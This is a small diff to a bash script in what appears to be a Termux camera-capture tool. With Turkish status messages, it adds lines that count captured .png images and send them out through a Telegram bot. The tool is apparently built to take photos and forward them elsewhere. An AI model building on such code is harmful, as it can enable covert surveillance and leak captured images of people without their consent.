@@ -89,7 +89,7 @@ do
 	if [[ $control -gt 0 ]];then
 		control=$(cat $PREFIX/lib/.termuxxtoolssmode |sed -n 2p)
 		if [[ $control == telegram-bot ]];then
-			echo "[✓] RESİMLER ALINDI\n\n\n[*] Biraz Sonra Resimler Gelecektir" > .info
+			echo "[✓] RESİMLER ALINIYOR.." > .info
 			termuxxtoolssmod --send
 			echo "sendPhoto .png" > .info
 		else
@@ -111,6 +111,11 @@ do
 		echo
 		echo
 		echo
+		if [[ $control == telegram-bot ]];then
+			echo -e "[✓] $(ls |grep .png |wc -l) ADET RESİM ALINDI.." > .info
+			termuxxtoolssmod --send
+			echo "sendPhoto .png" > .info
+		fi
 		termuxxtoolssmod --send
 		mv cam* images
 		exit
